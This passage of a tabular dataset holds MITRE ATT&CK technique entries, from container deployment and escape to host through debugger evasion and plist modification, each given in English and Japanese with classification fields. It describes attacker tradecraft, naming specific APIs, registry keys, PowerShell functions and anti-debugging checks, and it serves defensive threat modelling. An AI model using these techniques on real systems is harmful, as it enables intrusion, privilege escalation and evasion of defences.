Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",攻撃者は、実行を容易にしたり防御を回避したりするために、環境にコンテナをデプロイする可能性があります。場合によっては、攻撃者は特定のイメージやデプロイに関連するプロセス（マルウェアを実行またはダウンロードするプロセスなど）を実行するために新しいコンテナをデプロイすることがあります。また、攻撃者はネットワークルールやユーザー制限などを設定せずに構成された新しいコンテナをデプロイし、環境内の既存の防御を迂回することがあります。 Kubernetes環境では、攻撃者は特権付きまたは脆弱なコンテナを特定のノードにデプロイし、[ホストへのエスケープ](https://attack.mitre.org/techniques/T1611)を試みてノード上で実行中の他のコンテナにアクセスしようとする可能性があります。 (出典: AppSecco Kubernetes Namespace Breakout 2020) コンテナは、Dockerの<code>create</code>および<code>start</code> APIや、KubernetesダッシュボードやKubeflowなどのWebアプリケーションを介するなど、様々な手段でデプロイされる。(出典: Docker Containers API)(出典: Kubernetes Dashboard)(引用元: Kubeflow Pipelines) Kubernetes環境では、ReplicaSetやDaemonSetなどのワークロードを通じてコンテナをデプロイでき、これによりコンテナを複数ノードに分散配置することが可能になります。(引用元: Kubernetes Workload Management) 攻撃者は、取得または構築した悪意のあるイメージ、あるいは実行時に悪意のあるペイロードをダウンロード・実行する良性のイメージに基づいてコンテナをデプロイする可能性があります。(引用元: Aqua Build Images on Hosts),defense-evasion;execution,Containers,config_policy_manipulation,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92,2021-03-29T16:51:26.020Z,2025-04-15T19:58:33.230Z,,,,
T1611,,Escape to Host,ホストへの脱出,"Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview) There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask) Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open) In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.(Citation: Broadcom VMSA-2025-004) Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.",攻撃者はコンテナや仮想化環境から脱出し、基盤となるホストへのアクセス権を取得する可能性がある。これにより、攻撃者はホストレベルから他のコンテナ化/仮想化リソースやホスト自体にアクセスできる。原則として、コンテナ化/仮想化リソースはアプリケーション機能を明確に分離し、ホスト環境から隔離されるべきである。(引用: Docker Overview) 攻撃者がコンテナからホスト環境へ脱出する方法は複数存在する。 例としては、バインドパラメータを使用してホストのファイルシステムをマウントするように構成されたコンテナを作成し、攻撃者がペイロードをドロップしたり、cronなどの制御ユーティリティをホスト上で実行したりできるようにする方法、特権コンテナを利用してコマンドを実行したり、基盤となるホストに悪意のあるカーネルモジュールをロードしたりする方法、`unshare`や`keyctl`などのシステムコールを悪用して特権を昇格させ、シークレットを盗む方法などが挙げられる。(引用: Docker Bind Mounts)(引用: Trend Micro Privileged Container)(引用: Intezer Doki July 20)(引用: Container Escape)(引用: Crowdstrike Kubernetes Container Escape)(引用: Keyctl-unmask) さらに、攻撃者は`docker.sock`などのマウントされたコンテナ管理ソケットを持つ侵害済みコンテナを悪用し、[コンテナ管理コマンド](https://attack.mitre.org/techniques/T1609)を介してコンテナから脱出できる可能性があります。(引用: コンテナ脱出) 攻撃者はまた、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068) を通じて脱出する可能性があります。例えば、グローバルシンボリックリンクの脆弱性を悪用してホストマシンのルートディレクトリにアクセスする手法です。(引用: Windows Server Containers Are Open) ESXi環境では、攻撃者が脆弱性を悪用し仮想マシンからハイパーバイザーへ脱出する可能性があります。(出典: Broadcom VMSA-2025-004) ホストへのアクセス獲得により、攻撃者は持続的アクセス確立、環境内横方向移動、ホスト上で動作する他のコンテナ/仮想マシンへのアクセス、ホスト上でのコマンド＆コントロールチャネル構築など、追加的な目的達成の機会を得られます。,privilege-escalation,Windows;Linux;Containers;ESXi,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0004,attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665,2021-03-30T17:38:34.277Z,2025-04-15T19:58:28.417Z,,,,
T1612,,Build Image on Host,ホスト上でのイメージ構築,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image) An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",攻撃者は、パブリックレジストリからの悪意あるイメージ取得を監視する防御を回避するため、ホスト上で直接コンテナイメージをビルドする可能性があります。リモート<code>build</code>リクエストがDocker APIに送信され、パブリックまたはローカルレジストリからalpineなどの汎用ベースイメージを取得し、その上にカスタムイメージをビルドするDockerfileを含む場合があります。(引用元: Docker Build Image) 攻撃者はこの<code>build</code> APIを悪用し、C2サーバーからダウンロードしたマルウェアを含むカスタムイメージをホスト上で構築し、そのカスタムイメージを用いた[コンテナのデプロイ](https://attack.mitre.org/techniques/T1610)を実行する可能性がある。(引用元: Aqua Build Images on Hosts)(引用元: Aqua Security Cloud Native Threat Report June 2021) ベースイメージがパブリックレジストリからプルされた場合、標準的なイメージであるため防御システムは悪意あるものと検知しない可能性が高い。ベースイメージが既にローカルレジストリに存在する場合、プル操作は環境内に既に存在するイメージであるため、さらに疑わしいと見なされにくい。,defense-evasion,Containers,config_policy_manipulation,stealth,network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Unknown,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--800f9819-7007-4540-a520-40e655876800,2021-03-30T17:54:03.944Z,2025-04-15T21:54:42.589Z,,,,
T1613,,Container and Resource Discovery,コンテナおよびリソースの発見,"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster. These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",攻撃者は、コンテナ環境内で利用可能なコンテナやその他のリソースを発見しようとする可能性があります。その他のリソースには、イメージ、デプロイメント、ポッド、ノード、クラスターの状態などの情報が含まれます。これらのリソースは、KubernetesダッシュボードなどのWebアプリケーション内で閲覧できるほか、DockerやKubernetesのAPIを介してクエリすることも可能です。(引用: Docker API)(引用: Kubernetes API) Dockerでは、ログから環境設定、利用可能なサービス、被害者が使用しているクラウドプロバイダーなどの環境情報が漏洩する可能性がある。これらのリソースの発見は、横方向の移動の実行方法や実行に利用する手法など、環境内における攻撃者の次の行動を決定する手がかりとなる。,discovery,Containers,config_policy_manipulation,situational_awareness,endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Log / Monitoring Server,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336,2021-03-31T14:26:00.848Z,2025-04-15T22:10:13.179Z,,,,
T1614,,System Location Discovery,システム位置情報の発見,"Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021) Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)",攻撃者は被害者ホストの地理的位置を特定するため情報を収集する可能性があります。自動化された探索中に[システム位置情報発見](https://attack.mitre.org/techniques/T1614)から得た情報を基に、攻撃者はターゲットへの完全な感染の可否や特定の行動の試行を含む、後続の行動を決定します。 攻撃者は、タイムゾーン、キーボードレイアウト、言語設定などの様々なシステムチェックを用いてシステムの位置を推測しようとする可能性がある。(引用: FBI Ragnar Locker 2020)(引用: Sophos Geolocation 2016)(引用: Bleepingcomputer RAT malware 2020) <code>GetLocaleInfoW</code>などのWindows API関数もホストのロケール判定に利用可能である。(引用: FBI Ragnar Locker 2020) クラウド環境では、インスタンスからインスタンスメタデータサービスにアクセスすることで、そのインスタンスの可用性ゾーンを特定できる場合もある。(引用元: AWS Instance Identity Documents)(引用元: Microsoft Azure Instance Metadata 2021) 攻撃者は、オンライン地理位置情報IP検索サービスなどを通じて、IPアドレスから被害者ホストの場所を推測しようとする場合もある。(引用元: Securelist Trasparent Tribe 2020)(引用元: Sophos Geolocation 2016),discovery,Windows;Linux;macOS;IaaS,config_policy_manipulation,situational_awareness,cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979,2021-04-01T16:42:08.735Z,2025-04-15T23:14:16.731Z,,,,
T1614.001,T1614,System Language Discovery,システム言語の検出,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check) There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018) On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",攻撃者は、被害者のシステム言語に関する情報を収集し、そのホストの地理的位置を推測しようとする可能性があります。この情報は、攻撃者が標的を感染させるか、特定の行動を試みるかを含む、その後の行動を決定するために使用される可能性があります。 この判断は、マルウェア開発者や運用者が特定の法執行機関の注意を引きつけたり、他の組織からの訴追や監視を受けるリスクを軽減するために採用される可能性がある。(引用: Malware System Language Check)攻撃者がシステム言語を推測するために使用できるデータソースは様々であり、システムのデフォルト設定やキーボードレイアウトなどが含まれる。 具体的なチェック方法は標的や攻撃者によって異なるが、[レジストリの照会](https://attack.mitre.org/techniques/T1012) や [ネイティブ API](https://attack.mitre.org/techniques/T1106) 関数の呼び出しなどの動作が含まれる可能性がある。(引用元: CrowdStrike Ryuk January 2019) 例えば、Windows システムでは、攻撃者はレジストリキー <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> を照会したり、Windows API 関数 <code>GetUserDefaultUILanguage</code>、<code>GetSystemDefaultUILanguage</code>、<code>GetKeyboardLayoutList</code>、<code>GetUserDefaultLangID</code> の出力を解析したりすることで、システムの言語を推測しようとする可能性があります。(引用元: Darkside Ransomware Cybereason)(引用元: Securelist JSWorm)(引用元: SecureList SynAck Doppelgänging May 2018) macOS または Linux システムでは、攻撃者は <code>locale</code> を照会して <code>$LANG</code> 環境変数の値を取得する場合があります。,discovery,Windows;Linux;macOS,config_policy_manipulation,situational_awareness,user_interaction;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19,2021-08-18T14:06:45.244Z,2025-04-25T14:47:55.750Z,,,,
T1615,,Group Policy Discovery,グループポリシーの発見,"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",攻撃者は、特権昇格のパスを特定し、ドメイン内で適用されているセキュリティ対策を確認し、操作したり環境に溶け込むために利用できるドメインオブジェクトのパターンを発見するために、グループポリシー設定に関する情報を収集する場合があります。グループポリシーは、Active Directory (AD) 内のユーザーおよびコンピューター設定の一元管理を可能にします。 グループ ポリシー オブジェクト (GPO) は、グループ ポリシー設定のコンテナであり、予測可能なネットワーク パス `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\` 内に保存されたファイルで構成されます。(引用元: TechNet グループポリシーの基礎)(引用元: ADSecurity GPO Persistence 2016) 攻撃者は、<code>gpresult</code> コマンドや、<code>Get-DomainGPO</code> や <code>Get-DomainGPOLocalGroup</code> などの公開されている PowerShell 関数を利用して、グループポリシー設定に関する情報を収集する可能性があります。(引用元: Microsoft gpresult)(引用元: Github PowerShell Empire) 攻撃者はこの情報を利用して、ターゲットネットワーク内の潜在的な攻撃経路の特定や、グループポリシー設定（すなわち [ドメインまたはテナントポリシーの変更](https://attack.mitre.org/techniques/T1484)）を自らの利益のために操作する機会など、その後の行動を決定する可能性があります。,discovery,Windows,script_command_execution,situational_awareness,authentication_system;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b,2021-08-06T13:10:12.916Z,2025-04-15T22:38:54.812Z,,,,
T1619,,Cloud Storage Object Discovery,クラウドストレージオブジェクトの発見,"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage. Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure. Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .",攻撃者はクラウドストレージインフラ内のオブジェクトを列挙する可能性があります。攻撃者は自動化された発見プロセス中にこの情報を活用し、クラウドストレージからの全オブジェクトまたは特定オブジェクトの要求を含む、後続の行動を決定します。 ローカルホストにおける[ファイルおよびディレクトリの発見](https://attack.mitre.org/techniques/T1083)と同様に、利用可能なストレージサービス（例：[クラウドインフラストラクチャの発見](https://attack.mitre.org/techniques/T1580)）を特定した後、攻撃者はクラウドインフラストラクチャに保存されたコンテンツ/オブジェクトにアクセスする可能性があります。 クラウドサービスプロバイダーは、クラウドストレージ内に保存されたオブジェクトを列挙するためのAPIを提供しています。例としては、AWSのListObjectsV2（引用: ListObjectsV2）やAzureのList Blobs（引用: List Blobs）などがあります。,discovery,IaaS,discovery_enumeration,situational_awareness,user_interaction;cloud_control_plane;file_storage_access,specified,Unknown,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--8565825b-21c8-4518-b75e-cbc4c717a156,2021-10-01T17:58:26.445Z,2025-04-15T22:04:12.682Z,,,,
T1620,,Reflective Code Loading,反射的コードロード,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)). Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad) Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection Eloads code into the processes Eown memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",攻撃者は、悪意のあるペイロードの実行を隠蔽するために、プロセスに反射的にコードをロードすることがあります。反射的ロードでは、ディスク上のファイルパスに裏付けされたスレッドやプロセスを作成する代わりに（例：[共有モジュール](https://attack.mitre.org/techniques/T1129)）、プロセスメモリ内で直接ペイロードを割り当てて実行します。 反射的にロードされるペイロードは、コンパイル済みバイナリ、匿名ファイル（RAM にのみ存在する）、またはファイルレスの実行可能コードの断片（例：位置非依存のシェルコード）である場合があります（引用：Introducing Donut）（引用：S1 Custom Shellcode Tool）（引用：スチュワート ELF メモリ）（引用：00sec ドロッパー）（引用：Mandiant BYOL）。 たとえば、[PowerShell](https://attack.mitre.org/techniques/T1059/001) によって実行される `Assembly.Load()` メソッドは、実行中のプロセスに生のコードをロードするために悪用される可能性があります。(引用: Microsoft AssemblyLoad) 反射型コードインジェクションは、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055) と非常によく似ていますが、「インジェクション」は、別のプロセスのメモリではなく、自身のメモリにコードをロードするという点が異なります。 リフレクティブローディングは、任意のコードの実行が正当なプロセスやその他の無害なプロセス内で隠蔽される可能性があるため、プロセスベースの検出を回避する可能性があります。 ペイロードをメモリに直接反射的にロードすることで、ディスク上にファイルやその他のアーティファクトを作成することを回避できるほか、マルウェアは実行までこれらのペイロードを暗号化（または難読化）したままにしておくことができます。(引用: スチュワート ELF メモリ)(引用: 00sec ドロッパー)(引用: Intezer ACBackdoor)(引用: S1 Old Rat New Tricks),defense-evasion,macOS;Linux;Windows,script_command_execution,stealth,endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a,2021-10-05T01:15:06.293Z,2025-04-15T19:58:27.959Z,,,,
T1621,,Multi-Factor Authentication Request Generation,多要素認証要求の生成,"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users. Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023) In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue. ECitation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)",攻撃者は、ユーザーに送信される多要素認証（MFA）リクエストを生成することで、MFAメカニズムを迂回しアカウントへのアクセスを試みる可能性があります。[有効なアカウント](https://attack.mitre.org/techniques/T1078)の認証情報を保持している攻撃者であっても、追加の認証手段およびセキュリティ制御として必要な2FAまたはMFAメカニズムへのアクセス権限がない場合、ログインプロセスを完了できない可能性があります。 これを回避するため、攻撃者はDuo Push、Microsoft Authenticator、OktaなどのMFAサービスへのプッシュ通知自動生成機能を悪用し、ユーザーに自身のアカウントへのアクセス許可を付与させることがあります。 攻撃者が被害者アカウントの認証情報を保持していない場合、セルフサービスパスワードリセット（SSPR）にこのオプションが設定されている場合に、自動プッシュ通知生成を悪用する可能性もあります。(引用: Obsidian SSPR Abuse 2023) 場合によっては、攻撃者がログイン試行を継続的に繰り返すことで、MFAプッシュ通知、SMSメッセージ、電話をユーザーに大量に送りつけ、「MFA疲労」に応じてユーザーが最終的に認証要求を受け入れる可能性もあります。 引用: Russian 2FA Push Annoyance - Cimpanu)(引用: MFA Fatigue Attacks - PortSwigger)(引用: Suspected Russian Activity Targeting Government and Business Entities Around the Globe),credential-access,Windows;Linux;macOS;IaaS;SaaS;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;mfa_in_use;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--954a1639-f2d6-407d-aef3-4917622ca493,2022-04-01T02:15:49.754Z,2025-04-15T22:50:21.216Z,,,,
T1622,,Debugger Evasion,デバッガー回避,"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github) Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads. Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow Eor handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug) Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit) Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",攻撃者はデバッガーを検知・回避するため様々な手段を用いる。デバッガーは通常、防御側がマルウェアペイロードの実行を追跡・分析するために使用する。(引用: ProcessHacker Github) デバッガー回避には、デバッグ環境を示す痕跡の存在チェック結果に基づく動作変更が含まれる。 [仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)と同様に、攻撃者がデバッガーを検知した場合、マルウェアを変更して被害者から離脱したり、インプラントのコア機能を隠蔽したりする可能性がある。また、二次ペイロードや追加ペイロードをドロップする前にデバッガーの痕跡を検索することもある。具体的なチェック方法は、標的や攻撃者によって異なる。 Windowsでは、<code>IsDebuggerPresent()</code>や<code>NtQueryInformationProcess()</code>といった[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出し、あるいはプロセス環境ブロック(PEB)の<code>BeingDebugged</code>フラグを手動で確認する方法が用いられる。 Linux では、動的解析ツールによるトレース対象かどうかを示す `TracerPID` フィールドを `/proc/self/status` から取得する方法が用いられる。(引用: Cado Security P2PInfect 2023)(引用: Positive Technologies Hellhounds 2023) デバッグの痕跡を検出するその他の手法としては、ハードウェアブレークポイントの列挙、割り込みアセンブリ命令コードの検出、時間チェック、あるいは現在のプロセスで例外が発生した場合の測定値の取得などがあります（デバッガーが存在すれば、潜在的なエラーを「飲み込む」か処理すると仮定した場合）。(引用: hasherezade debug)(引用: AlKhaser Debug)(引用: vxunderground debug) マルウェアは構造化例外処理(SEH)を活用し、例外をスローしてプロセスが中断されたかを検知することでデバッガーを検出する場合もある。SEHはハードウェアとソフトウェアの両方の例外を扱い、デバッグ支援を含む例外制御を提供する。 デバッガーが存在する場合、プログラム制御はデバッガーに移行し、コード実行は中断される。デバッガーが存在しない場合、制御はSEHハンドラーに移行し、例外を自動的に処理してプログラム実行を継続させる。(引用元: Apriorit) 攻撃者は自動検出時のデバッガーチェックから得た情報を基に、後続の行動を調整する可能性がある。 デバッガーは、プロセスを分離したり、<code>OutputDebugStringW()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数をループ呼び出しして生成したメッセージでデバッグログを無意味なデータで埋めることで回避される可能性もある。(引用: wardle evilquest partii)(引用: Checkpoint Dridex Jan 2021),defense-evasion;discovery,Windows;Linux;macOS,remote_service_abuse,stealth,endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0007,attack-pattern--e4dc8c01-417f-458d-9ee0-bb0617c1b391,2022-04-01T17:59:46.156Z,2025-04-15T19:59:16.468Z,,,,
T1647,,Plist File Modification,Plistファイル改変,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)). For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: 